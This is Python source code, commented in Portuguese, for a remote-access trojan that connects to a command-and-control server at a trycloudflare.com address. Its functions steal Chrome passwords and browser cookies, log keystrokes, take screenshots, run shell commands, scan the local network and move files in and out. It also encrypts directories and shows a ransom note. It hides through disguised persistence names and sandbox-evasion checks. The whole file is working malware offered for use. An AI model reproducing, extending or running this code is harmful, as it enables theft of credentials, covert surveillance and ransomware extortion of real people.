import os
import requests
import sqlite3
import json
import sys
import base64
import shutil
import time
import platform
import socket
import uuid
import subprocess
import random
import ctypes
import threading
import ipaddress
from datetime import datetime
from PIL import ImageGrab
import psutil
import browser_cookie3

# --- PLATFORM-SPECIFIC IMPORTS ---
try:
    from win32 import win32crypt
except ImportError:
    win32crypt = None
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad, unpad
    from Cryptodome.Random import get_random_bytes
except ImportError:
    AES = None
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    Listener = None

# --- CONFIGURAÇÕES E EVASÃO ---
AGENT_VERSION = "2.2" # <-- VERSÃO DO AGENTE ATUALIZADA
SERVER_URL = "https://additional-mega-establishment-requesting.trycloudflare.com" # <-- MANTENHA A SUA URL
AGENT_ID = None
FAKE_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
HTTP_HEADERS = {'User-Agent': FAKE_USER_AGENT}
MIN_SLEEP = 5
MAX_SLEEP = 12

# --- LOGGING INTERNO ---
def write_internal_log(message):
    # Descomente as linhas abaixo para ativar o logging de depuração em um arquivo
    # try:
    #     with open("agent_internal_log.txt", "a") as f:
    #         f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    # except:
    #     pass
    pass

# --- FUNÇÕES DE EVASÃO ---
def anti_analysis_checks():
    write_internal_log("Iniciando checagens anti-análise.")
    suspicious_usernames = ["sandbox", "test", "vagrant", "tester", "maltest"]
    if os.getlogin().lower() in suspicious_usernames:
        write_internal_log(f"Evasão: Nome de usuário suspeito '{os.getlogin()}' detectado.")
        return True
    if psutil.cpu_count(logical=False) < 2:
        write_internal_log(f"Evasão: Número baixo de núcleos de CPU ({psutil.cpu_count(logical=False)}) detectado.")
        return True
    suspicious_processes = ["wireshark.exe", "procmon.exe", "fiddler.exe", "ollydbg.exe", "sysmon.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in suspicious_processes:
            write_internal_log(f"Evasão: Processo de análise '{proc.info['name']}' detectado.")
            return True
    write_internal_log("Checagens anti-análise concluídas. Nenhum indicador encontrado.")
    return False

# --- LÓGICA DE OFUSCAÇÃO NO SISTEMA DE ARQUIVOS ---
def self_install_and_persist():
    system = platform.system()
    try:
        if system == "Windows" and getattr(sys, 'frozen', False):
            install_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'UpdateService')
            install_name = "winupdate.exe"
            install_path = os.path.join(install_dir, install_name)
            if sys.executable.lower() == install_path.lower():
                write_internal_log("Agente já está rodando do local de instalação (Windows).")
                return
            write_internal_log("Primeira execução (Windows). Realizando auto-instalação...")
            os.makedirs(install_dir, exist_ok=True)
            shutil.copy2(sys.executable, install_path)
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            command = f'reg add HKCU\\{key_path} /v WindowsSystemUpdate /t REG_SZ /d "{install_path}" /f'
            subprocess.run(command, shell=True, capture_output=True)
            subprocess.Popen(install_path)
            sys.exit(0)
        elif system == "Linux" and not getattr(sys, 'frozen', False):
            install_dir = os.path.expanduser('~/.config/systemd/user')
            install_name = "gnome-shell-service"
            install_path = os.path.join(install_dir, install_name)
            current_path = os.path.abspath(__file__)
            if current_path == install_path:
                write_internal_log("Agente já está rodando do local de instalação (Linux).")
                return
            write_internal_log("Primeira execução (Linux). Realizando auto-instalação...")
            os.makedirs(install_dir, exist_ok=True)
            shutil.copy2(current_path, install_path)
            os.chmod(install_path, 0o755)
            executable_cmd = f"python3 {install_path}"
            command = f'(crontab -l 2>/dev/null | grep -v -F "{executable_cmd}" ; echo "@reboot {executable_cmd}") | crontab -'
            subprocess.run(command, shell=True, capture_output=True)
            subprocess.Popen(['python3', install_path])
            sys.exit(0)
    except Exception as e:
        write_internal_log(f"Falha durante a auto-instalação: {e}. O agente continuará a execução a partir do local atual.")

# --- DEMAIS FUNÇÕES DO AGENTE ---
def capture_system_info():
    try:
        internal_ip = socket.gethostbyname(socket.gethostname())
    except:
        internal_ip = "N/A"
    try:
        external_ip = requests.get('https://api.ipify.org', timeout=5, headers=HTTP_HEADERS).text
    except:
        external_ip = "N/A"
    info = {
        "username": os.getlogin(), "hostname": socket.gethostname(),
        "internal_ip": internal_ip, "external_ip": external_ip,
        "os_name": platform.system(), "os_version": platform.version(),
    }
    return info, "sysinfo_result"

def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, encoding='utf-8', errors='ignore')
        output = f"COMMAND: {command}\n\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
        return (output, "shell_result") if result.returncode == 0 else (output, "error")
    except Exception as e:
        return f"Erro ao executar o processo do shell: {e}", "error"

def cleanup_and_self_destruct():
    system = platform.system()
    try:
        executable_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if system == "Windows":
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            command = f'reg delete HKCU\\{key_path} /v WindowsSystemUpdate /f'
            subprocess.run(command, shell=True, capture_output=True)
            delete_command = f'ping 127.0.0.1 -n 4 > NUL && del /F "{executable_path}"'
            subprocess.Popen(delete_command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif system == "Linux":
            executable_cmd = f"python3 {executable_path}" if not getattr(sys, 'frozen', False) else executable_path
            command = f"(crontab -l | grep -v -F '{executable_cmd}' ; ) | crontab -"
            subprocess.run(command, shell=True, capture_output=True)
            delete_command = f'sleep 3 && rm -f "{executable_path}"'
            subprocess.Popen(delete_command, shell=True)
        send_result("cleanup_task", "Persistência removida e autodestruição agendada. Desconectando...", "info")
        sys.exit(0)
    except Exception as e:
        return f"Falha na limpeza: {e}", "error"

def show_ransom_note(note_text):
    system = platform.system()
    try:
        if system == "Windows":
            safe_text = note_text.replace("'", "''").replace("\\n", "`n")
            command = f"""Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('{safe_text}', 'AVISO IMPORTANTE', 'OK', 'Warning');"""
            subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return "Nota de resgate exibida ao usuário via PowerShell.", "ransom_note_displayed"
        elif system == "Linux":
            safe_text = note_text.replace('\\n', '\n')
            if shutil.which("zenity"):
                subprocess.Popen(['zenity', '--warning', '--title=AVISO IMPORTANTE', f'--text={safe_text}'])
                return "Nota de resgate exibida ao usuário via Zenity.", "ransom_note_displayed"
            elif shutil.which("kdialog"):
                subprocess.Popen(['kdialog', '--error', safe_text, '--title', 'AVISO IMPORTANTE'])
                return "Nota de resgate exibida ao usuário via KDialog.", "ransom_note_displayed"
            else:
                return "Falha ao exibir nota: Nenhuma ferramenta GUI (zenity, kdialog) encontrada no alvo Linux.", "error"
        else:
            return f"SO '{system}' não suportado para exibição de pop-up.", "error"
    except Exception as e:
        return f"Falha ao exibir nota de resgate: {e}", "error"

keylog_buffer = []; keylogger_thread = None; keylogger_active = threading.Event(); buffer_lock = threading.Lock(); KEYLOG_REPORT_INTERVAL = 30
def on_press(key):
    with buffer_lock:
        try: keylog_buffer.append(key.char)
        except AttributeError:
            if key == Key.space: keylog_buffer.append(" ")
            elif key == Key.enter: keylog_buffer.append("\n")
            else: keylog_buffer.append(f"[{str(key).split('.')[-1]}]")
def report_keylogs():
    global keylog_buffer
    with buffer_lock:
        if not keylog_buffer: return
        log_data = "".join(keylog_buffer); keylog_buffer = []
    payload = {"agent_id": AGENT_ID, "data_type": "keylogger_data", "result": log_data}
    try: requests.post(f"{SERVER_URL}/task_result", json=payload, headers=HTTP_HEADERS, timeout=10)
    except:
        with buffer_lock: keylog_buffer = list(log_data) + keylog_buffer
def keylogger_run():
    if not Listener: return
    listener = Listener(on_press=on_press); listener.start()
    while keylogger_active.is_set():
        time.sleep(KEYLOG_REPORT_INTERVAL); report_keylogs()
    listener.stop(); report_keylogs()
def start_keylogger():
    global keylogger_thread
    if keylogger_thread and keylogger_thread.is_alive(): return "Keylogger já está ativo.", "info"
    keylogger_active.set(); keylogger_thread = threading.Thread(target=keylogger_run, daemon=True); keylogger_thread.start()
    return "Keylogger iniciado com sucesso.", "keylogger_started"
def stop_keylogger():
    if not keylogger_thread or not keylogger_thread.is_alive(): return "Keylogger não estava ativo.", "info"
    keylogger_active.clear(); return "Sinal de parada enviado ao keylogger.", "keylogger_stopped"
def check_privileges():
    system = platform.system()
    try:
        if system == "Windows": return "Administrador" if ctypes.windll.shell32.IsUserAnAdmin() != 0 else "Usuário Padrão"
        elif system == "Linux": return "Root" if os.geteuid() == 0 else "Usuário Padrão"
        else: return "N/A"
    except: return "Desconhecido"

def register_with_c2():
    global AGENT_ID
    write_internal_log("Tentando registrar com o C2...")
    try:
        sys_info, _ = capture_system_info()
        sys_info['privileges'] = check_privileges()
        sys_info['agent_version'] = AGENT_VERSION
        response = requests.post(f"{SERVER_URL}/register", json=sys_info, headers=HTTP_HEADERS, timeout=10)
        if response.status_code == 200:
            AGENT_ID = response.json().get("agent_id")
            write_internal_log(f"Registro bem-sucedido. AGENT_ID: {AGENT_ID}")
            return True
        else:
            write_internal_log(f"Falha no registro. Status Code: {response.status_code}")
            return False
    except Exception as e:
        write_internal_log(f"Erro de conexão durante o registro: {e}")
        return False

def main_loop():
    write_internal_log("Entrando no loop principal.")
    while True:
        task = get_task()
        if task:
            command, task_id, args = task.get("command"), task.get("task_id"), task.get("args")
            result_data, data_type = None, "generic_result"
            if command == "cleanup": cleanup_and_self_destruct()
            elif command == "ransom_note": result_data, data_type = show_ransom_note(args)
            elif command == "network_scan": result_data, data_type = scan_internal_network()
            elif command == "keylogger_start": result_data, data_type = start_keylogger()
            elif command == "keylogger_stop": result_data, data_type = stop_keylogger()
            elif command == "encrypt": result_data, data_type = encrypt_files_on_target(args)
            elif command == "download": result_data, data_type = download_from_target(args)
            elif command == "upload": result_data, data_type = upload_to_target(args.get('destination_path'), args.get('file_content_b64'))
            elif command == "screenshot": result_data, data_type = capture_screenshot()
            elif command == "sysinfo": result_data, data_type = capture_system_info()
            elif command == "cookies": result_data, data_type = capture_cookies()
            elif command == "processes": result_data, data_type = capture_process_info()
            elif command == "credentials": result_data, data_type = capture_credentials()
            elif command == "shell": result_data, data_type = execute_shell_command(args)
            elif command == "persist": result_data, data_type = establish_persistence()
            elif command == "decrypt_target": result_data, data_type = decrypt_files_on_target(args)
            elif command == "sleep": time.sleep(random.randint(MIN_SLEEP, MAX_SLEEP)); continue
            if result_data is not None: send_result(task_id, result_data, data_type)
        else: time.sleep(random.randint(15, 25))

def scan_internal_network():
    try:
        host_name = socket.gethostname(); host_ip = socket.gethostbyname(host_name)
        net = ipaddress.ip_network(f"{host_ip}/24", strict=False)
        live_hosts = []; threads = []; lock = threading.Lock()
        for ip in net.hosts():
            thread = threading.Thread(target=ping_host, args=(ip, live_hosts, lock), daemon=True)
            threads.append(thread); thread.start()
        for thread in threads: thread.join(timeout=2.0)
        report = {"agent_ip": host_ip, "network": str(net), "live_hosts_found": len(live_hosts), "live_hosts": sorted(live_hosts, key=ipaddress.IPv4Address)}
        return report, "network_scan_result"
    except Exception as e: return f"Erro ao escanear a rede: {e}", "error"

def ping_host(ip, live_hosts, lock):
    system = platform.system()
    try:
        if system == "Windows":
            command = ["ping", "-n", "1", "-w", "500", str(ip)]
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            creationflags = subprocess.CREATE_NO_WINDOW
        else:
            command = ["ping", "-c", "1", "-W", "0.5", str(ip)]
            startupinfo = None
            creationflags = 0
        
        result = subprocess.run(command, capture_output=True, startupinfo=startupinfo, creationflags=creationflags)
        if result.returncode == 0:
            with lock:
                live_hosts.append(str(ip))
    except Exception:
        pass

def encrypt_files_on_target(target_path):
    if not AES: return "Erro: Biblioteca PyCryptodomex não encontrada.", "error"
    if not os.path.isdir(target_path): return f"Erro: O caminho '{target_path}' não é um diretório válido.", "error"
    key = get_random_bytes(32)
    encrypted_files, errors = [], []
    for root, dirs, files in os.walk(target_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            if file_path == sys.executable or file_path.endswith('.encrypted'): continue
            try:
                with open(file_path, 'rb') as f_in: data = f_in.read()
                cipher = AES.new(key, AES.MODE_CBC)
                ciphertext_bytes = cipher.encrypt(pad(data, AES.block_size))
                with open(file_path, 'wb') as f_out: f_out.write(cipher.iv); f_out.write(ciphertext_bytes)
                new_file_path = file_path + ".encrypted"; os.rename(file_path, new_file_path)
                encrypted_files.append(new_file_path)
            except Exception as e: errors.append(f"Falha ao criptografar {file_path}: {e}")
    report = {"status": "Concluído", "target_directory": target_path, "files_encrypted": len(encrypted_files), "errors_encountered": len(errors), "encryption_key_base64": base64.b64encode(key).decode('utf-8'), "details": {"encrypted_files_list": encrypted_files, "error_log": errors}}
    return report, "encryption_report"

def decrypt_files_on_target(args):
    if not AES: return "Erro: Biblioteca PyCryptodomex não encontrada no agente.", "error"
    try: target_path = args['target_path']; key_b64 = args['key_b64']
    except KeyError: return "Erro: Argumentos 'target_path' ou 'key_b64' faltando.", "error"
    if not os.path.isdir(target_path): return f"Erro: O caminho '{target_path}' não é um diretório válido no alvo.", "error"
    try:
        key = base64.b64decode(key_b64)
        if len(key) != 32: return "Erro: A chave de descriptografia fornecida é inválida (tamanho incorreto).", "error"
    except Exception: return "Erro: A chave de descriptografia fornecida não é uma string Base64 válida.", "error"
    decrypted_files, errors = [], []
    for root, dirs, files in os.walk(target_path):
        for filename in files:
            if filename.endswith(".encrypted"):
                file_path = os.path.join(root, filename)
                try:
                    with open(file_path, 'rb') as f_in: iv = f_in.read(16); ciphertext = f_in.read()
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    original_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
                    original_path = file_path[:-len(".encrypted")]
                    with open(original_path, 'wb') as f_out: f_out.write(original_data)
                    os.remove(file_path)
                    decrypted_files.append(original_path)
                except Exception as e: errors.append(f"Falha ao descriptografar {file_path}: {e}")
    report = {"status": "Concluído", "target_directory": target_path, "files_decrypted": len(decrypted_files), "errors_encountered": len(errors), "error_log": errors}
    return report, "decryption_report"

def download_from_target(remote_path):
    try:
        if not os.path.exists(remote_path) or not os.path.isfile(remote_path): return f"Erro: Arquivo não encontrado em '{remote_path}'", "error"
        with open(remote_path, 'rb') as f: file_content = f.read()
        return {"filename": os.path.basename(remote_path), "content_b64": base64.b64encode(file_content).decode('utf-8')}, "file_download"
    except Exception as e: return f"Erro ao ler o arquivo: {e}", "error"

def upload_to_target(destination_path, file_content_b64):
    try:
        file_content = base64.b64decode(file_content_b64)
        dir_name = os.path.dirname(destination_path)
        if dir_name: os.makedirs(dir_name, exist_ok=True)
        with open(destination_path, 'wb') as f: f.write(file_content)
        return f"Arquivo salvo com sucesso em: {destination_path}", "upload_success"
    except Exception as e: return f"Erro ao salvar o arquivo: {e}", "error"

def get_chrome_path(component: str) -> str:
    system = platform.system()
    if system == "Windows": base_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data")
    elif system == "Linux": base_path = os.path.expanduser("~/.config/google-chrome")
    elif system == "Darwin": base_path = os.path.expanduser("~/Library/Application Support/Google/Chrome")
    else: return None
    path_map = {"Local State": os.path.join(base_path, "Local State"), "Login Data": os.path.join(base_path, "Default", "Login Data"), "History": os.path.join(base_path, "Default", "History")}
    return path_map.get(component)

def get_encryption_key():
    local_state_path = get_chrome_path("Local State")
    if not local_state_path or not os.path.exists(local_state_path): return None
    with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    system = platform.system()
    if system == "Windows" and win32crypt: return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    elif system == "Linux" and AES: return encrypted_key
    return None

def decrypt_password(password: bytes, key: bytes) -> str:
    system = platform.system()
    try:
        if system == "Windows" and win32crypt: return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
        elif system == "Linux" and AES:
            iv, payload = password[3:15], password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
    except: return "Nao foi possivel descriptografar"
    return "SO nao suportado"

def capture_credentials():
    key = get_encryption_key()
    if not key: return "Nao foi possivel obter a chave de criptografia.", "error"
    db_path = get_chrome_path("Login Data")
    if not db_path or not os.path.exists(db_path): return "Banco de dados de login nao encontrado.", "error"
    temp_db = "temp_login_data.db"
    shutil.copy2(db_path, temp_db)
    credentials = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            origin_url, action_url, username, encrypted_password = row
            if username and encrypted_password:
                credentials.append({"origin_url": origin_url, "action_url": action_url, "username": username, "password": decrypt_password(encrypted_password, key)})
        conn.close()
    except Exception as e: return str(e), "error"
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)
    return credentials, "credentials_result"

def capture_screenshot():
    try:
        screenshot_path = "screenshot.png"
        ImageGrab.grab().save(screenshot_path)
        with open(screenshot_path, "rb") as file: screenshot_data = base64.b64encode(file.read()).decode("utf-8")
        os.remove(screenshot_path)
        return screenshot_data, "screenshot_result"
    except Exception as e: return str(e), "error"

def capture_cookies():
    try:
        cookies = {}
        for browser in ["chrome", "firefox", "edge", "opera"]:
            try: cookies[browser.capitalize()] = {c.name: c.value for c in getattr(browser_cookie3, browser)()}
            except: continue
        return cookies, "cookies_result"
    except Exception as e: return str(e), "error"

def capture_process_info():
    try: return [p.info for p in psutil.process_iter(['pid', 'name', 'username'])], "processes_result"
    except Exception as e: return str(e), "error"

def establish_persistence():
    system = platform.system()
    try:
        executable_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if system == "Windows":
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            command = f'reg add HKCU\\{key_path} /v WindowsSystemUpdate /t REG_SZ /d "{executable_path}" /f'
            subprocess.run(command, shell=True, capture_output=True)
            return "Persistencia estabelecida no Windows via Chave de Registro.", "persistence_result"
        elif system == "Linux" and not getattr(sys, 'frozen', False):
            command = f'(crontab -l 2>/dev/null | grep -v -F "python3 {executable_path}" ; echo "@reboot python3 {executable_path}") | crontab -'
            subprocess.run(command, shell=True, capture_output=True)
            return "Persistencia estabelecida no Linux via Crontab.", "persistence_result"
    except Exception as e: return f"Falha ao estabelecer persistencia: {str(e)}", "error"
    return "SO nao suportado para persistencia.", "error"

def get_task():
    if not AGENT_ID: return None
    try:
        response = requests.get(f"{SERVER_URL}/get_task/{AGENT_ID}", headers=HTTP_HEADERS, timeout=10)
        return response.json() if response.status_code == 200 else None
    except: return None

def send_result(task_id, result_data, data_type):
    if not AGENT_ID: return
    payload = {"agent_id": AGENT_ID, "task_id": task_id, "data_type": data_type, "result": result_data}
    try: requests.post(f"{SERVER_URL}/task_result", json=payload, headers=HTTP_HEADERS, timeout=20)
    except: print("Erro ao enviar resultado.")

if __name__ == "__main__":
    write_internal_log(f"--- INÍCIO DA EXECUÇÃO DO AGENTE (Versão: {AGENT_VERSION}) ---")
    
    # A ordem é importante: primeiro se instala, depois checa o ambiente.
    self_install_and_persist()
    
    if anti_analysis_checks():
        write_internal_log("Ambiente suspeito detectado. Encerrando.")
        sys.exit(0)
    
    # Se o ambiente for seguro, inicia o loop principal de comunicação.
    write_internal_log("Iniciando loop de registro.")
    while not AGENT_ID:
        if register_with_c2():
            main_loop()
        else:
            write_internal_log("Falha no registro, aguardando 30s.")
            time.sleep(30)

